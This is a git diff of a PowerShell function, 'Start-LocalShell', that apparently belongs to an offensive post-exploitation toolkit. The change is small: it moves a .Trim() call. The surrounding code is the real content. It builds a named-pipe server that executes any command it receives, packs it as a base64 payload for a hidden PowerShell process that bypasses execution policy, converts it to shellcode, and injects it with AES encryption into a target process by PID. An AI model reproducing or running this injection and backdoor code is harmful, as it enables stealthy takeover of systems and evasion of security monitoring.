@@ -2426,9 +2426,9 @@ function Start-LocalShell {
             $Srv_mg = "`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID_mg`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm=New-Object System.Threading.Timer(`$tcb,`$ps,600000,[System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite,[System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
             $b64_mg = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Srv_mg))
             $fin_mg = "powershell.exe -NoLogo -NonInteractive -ep bypass -Window Hidden -enc $b64_mg"
-            $sc_mg  = ShellGen -ShCommand $fin_mg
+            $sc_mg  = (ShellGen -ShCommand $fin_mg).Trim()
             Write-Output " [*] Injecting shellcode into PID $targetPid via PInject..."
-            PInject /t:1 /f:hex /pid:$targetPid /sc:$sc_mg.Trim() /enc:AES
+            PInject /t:1 /f:hex /pid:$targetPid /sc:$sc_mg /enc:AES
             Write-Output " [+] Injected. Connecting to pipe $PN (15s timeout)..."
             Start-Sleep -Seconds 2
             try {
